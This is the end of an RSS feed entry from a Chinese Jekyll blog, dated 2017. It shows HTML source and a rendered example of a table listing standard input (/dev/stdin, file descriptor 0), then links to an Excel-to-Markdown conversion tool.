&lt;span class=&quot;lineno&quot;&gt; 4 &lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;设备文件名&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5 &lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;文件描述符&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6 &lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;类型&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7 &lt;/span&gt;        &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8 &lt;/span&gt;        &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9 &lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;键盘&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10 &lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;/dev/stdin&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11 &lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;0&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12 &lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;标准输入&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13 &lt;/span&gt;        &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;table&gt;
        &lt;tr&gt;
            &lt;th&gt;设备&lt;/th&gt;
            &lt;th&gt;设备文件名&lt;/th&gt;
            &lt;th&gt;文件描述符&lt;/th&gt;
            &lt;th&gt;类型&lt;/th&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
            &lt;th&gt;键盘&lt;/th&gt;
            &lt;th&gt;/dev/stdin&lt;/th&gt;
            &lt;th&gt;0&lt;/th&gt;
            &lt;th&gt;标准输入&lt;/th&gt;
        &lt;/tr&gt;
&lt;/table&gt;
&lt;ol&gt;
  &lt;li&gt;方案三
excel转markdown工具
https://link.zhihu.com/?target=http://fanfeilong.github.io/exceltk0.0.4.7z&lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Fri, 15 Sep 2017 00:00:00 +0800</pubDate>
        <link>https://xiazemin.github.io/MyBlog/jekyll/2017/09/15/markdown-table.html</link>
        <guid isPermaLink="true">https://xiazemin.github.io/MyBlog/jekyll/2017/09/15/markdown-table.html</guid>
        
        
        <category>jekyll</category>
        
      </item>
    
  </channel>
</rss>
